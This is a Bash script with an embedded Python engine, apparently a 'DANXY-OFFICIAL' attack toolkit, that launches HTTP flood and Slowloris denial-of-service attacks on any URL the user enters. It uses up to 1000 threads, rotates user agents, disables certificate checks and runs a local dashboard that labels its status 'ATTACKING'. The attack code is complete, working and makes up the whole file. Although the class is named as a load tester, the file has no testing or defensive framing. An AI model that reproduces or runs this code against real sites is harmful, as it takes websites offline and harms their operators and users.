#!/usr/bin/env bash
set -euo pipefail

kontol='\033[38;2;0;243;255m'
jembot='\033[38;2;255;0;255m'
kirek='\033[38;2;57;255;20m'
biawak='\033[38;2;255;191;0m'
biawok='\033[0m'
yembot=$(mktemp --suffix=.py)
yembott=$(mktemp --suffix=.html)
trap 'rm -f "$yembot" "$yembott"' EXIT

banner(){
  clear
  echo -e "${kontol}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${biawok}"
  echo -e "${jembot}        [ ✓ ] DANXY-OFFICIAL 2025 – TOOLS V8.3 [ ✓ ]${biawok}"
  echo -e "${kontol}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${biawok}"
  echo
}

validate_url(){
  [[ $1 =~ ^https?://.+ ]] && return 0 || return 1
}

build_python_engine(){
cat > "$yembot" <<'PYEOF'
import os,signal,time,json,random,requests,socket,ssl,threading,urllib3
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse
urllib3.disable_warnings()

class UltimateLoadTester:
    def __init__(self):
        self.is_testing=False
        self.lock=threading.Lock()
        self.total=0; self.ok=0; self.fail=0
        self.method=""; self.target=""; self.threads=0; self.duration=0
        self.start_t=0
        self.ua=[{"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"},
                 {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"}]
    def stats(self):
        with self.lock:
            elap=time.time()-self.start_t if self.start_t else 0
            rps=round(self.total/elap,2) if elap else 0
            return {"total":self.total,"ok":self.ok,"fail":self.fail,"rps":rps,"method":self.method,"active":self.is_testing}
    def http_flood(self):
        s=requests.Session()
        while self.is_testing:
            try:
                r=s.get(self.target,headers=random.choice(self.ua),verify=False,timeout=10)
                with self.lock:self.total+=1; self.ok+=1 if r.status_code<400 else 0; self.fail+=1 if r.status_code>=400 else 0
            except:pass
            time.sleep(random.uniform(0.01,0.05))
    def slowloris(self):
        p=urlparse(self.target); h=p.hostname; port=p.port or (443 if p.scheme=="https" else 80)
        while self.is_testing:
            try:
                so=socket.socket(); so.settimeout(10)
                if port==443:ctx=ssl.create_default_context(); so=ctx.wrap_socket(so,server_hostname=h)
                so.connect((h,port))
                so.send(f"GET {p.path or '/'} HTTP/1.1\r\nHost:{h}\r\nUser-Agent:{random.choice(self.ua)['User-Agent']}\r\n".encode())
                while self.is_testing:time.sleep(15);so.send(b"X-a: 1\r\n")
            except:pass
    def start(self,target,method,threads,duration):
        self.target=target;self.method=method;self.threads=threads;self.duration=duration
        self.total=0;self.ok=0;self.fail=0;self.start_t=time.time();self.is_testing=True
        for _ in range(threads):
            if method=="HTTP FLOOD":t=threading.Thread(target=self.http_flood)
            elif method=="SLOWLORIS":t=threading.Thread(target=self.slowloris)
            else:t=threading.Thread(target=self.http_flood)
            t.daemon=True; t.start()
        time.sleep(duration);self.is_testing=False;time.sleep(2)

engine=UltimateLoadTester()

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path=="/":
            self.send_response(200);self.send_header("Content-type","text/html");self.end_headers()
            self.wfile.write(HTML.encode())
        elif self.path=="/stats":
            self.send_response(200);self.send_header("Content-type","application/json");self.end_headers()
            self.wfile.write(json.dumps(engine.stats()).encode())
    def log_message(self,format,*args):pass

HTML="""
<!doctype html>
<html lang='id'>
<head>
<meta charset='utf-8'>
<title>KARMA-LOAD 2025 | Live</title>
<style>
body{background:#0a0a1a;color:#00f3ff;font-family:'Courier New',monospace;text-align:center}
#box{margin:10% auto;width:320px;border:1px solid #00f3ff;padding:20px;border-radius:10px;box-shadow:0 0 10px #00f3ff}
h1{font-size:24px;margin-bottom:15px}
.stat{margin:8px 0}
.btn{background:transparent;border:1px solid #00f3ff;color:#00f3ff;padding:8px 15px;margin-top:15px;cursor:pointer;border-radius:5px}
.btn:hover{background:#00f3ff;color:#000}
</style>
</head>
<body>
<div id='box'>
<h1>KARMA-LOAD 2025</h1>
<div class='stat'>Status : <span id='active'>-</span></div>
<div class='stat'>Total Req : <span id='total'>0</span></div>
<div class='stat'>Success : <span id='ok'>0</span></div>
<div class='stat'>Failed : <span id='fail'>0</span></div>
<div class='stat'>RPS : <span id='rps'>0</span></div>
<button class='btn' onclick='location.reload()'>Refresh</button>
</div>
<script>
async function update(){
let d=await(await fetch('/stats')).json();
document.getElementById('active').textContent=d.active?'ATTACKING':'IDLE';
document.getElementById('total').textContent=d.total;
document.getElementById('ok').textContent=d.ok;
document.getElementById('fail').textContent=d.fail;
document.getElementById('rps').textContent=d.rps;
}
setInterval(update,1000); update();
</script>
</body>
</html>
"""

def run_server():
    server=HTTPServer(('localhost',8888),Handler)
    print("Dashboard ready at http://localhost:8888")
    try:server.serve_forever()
    except KeyboardInterrupt:pass
    server.shutdown()

if __name__=="__main__":
    import sys
    if len(sys.argv)<5:sys.exit(1)
    target,method,threads,dur=sys.argv[1],sys.argv[2],int(sys.argv[3]),int(sys.argv[4])
    threading.Thread(target=run_server,daemon=True).start()
    engine.start(target,method,threads,dur)
    print("Attack finished.")
PYEOF
}

menu(){
  while :;do
    banner
    echo -e "${kirek}[1]${biawok} HTTP FLOOD"
    echo -e "${kirek}[2]${biawok} SLOWLORIS"
    echo -e "${kirek}[3]${biawok} KARMA HTTP FLOOD"
    echo -e "${kirek}[4]${biawok} KARMA SLOW READ"
    echo -e "${kirek}[0]${biawok} Exit"
    echo
    echo -n -e "${biawak}[ ? ] Choose : ${biawok}"
    read -r p
    case $p in
      1)launch "HTTP FLOOD";;
      2)launch "SLOWLORIS";;
      3)launch "KARMA HTTP FLOOD";;
      4)launch "KARMA SLOW READ";;
      0)exit 0;;
      *)echo -e "${jembot}[ ! ] Invalid${biawok}";sleep 1;;
    esac
  done
}

launch(){
  METHOD=$1
  echo -n -e "${kontol}[ ✓ ] Target URL : ${biawok}";read -r TARGET
  validate_url "$TARGET" || { echo -e "${jembot}[ ! ] Bad URL${biawok}";sleep 1;return; }
  echo -n -e "${kontol}[ ✓ ] Threads (1-1000) : ${biawok}";read -r THREADS
  ((THREADS>=1&&THREADS<=1000)) || { echo -e "${jembot}[ ! ] 1-1000 only${biawok}";sleep 1;return; }
  echo -n -e "${kontol}[ ✓ ] Duration (s) : ${biawok}";read -r DUR
  ((DUR>=1)) || { echo -e "${jembot}[ ! ] Min 1s${biawok}";sleep 1;return; }
  build_python_engine
  echo -e "${kirek}[ ✓ ] Starting $METHOD ...${biawok}"
  python3 "$yembot" "$TARGET" "$METHOD" "$THREADS" "$DUR"
  echo;echo -n -e "${biawak}[ ✓ ] Press ENTER to back${biawok}";read -r
}

menu
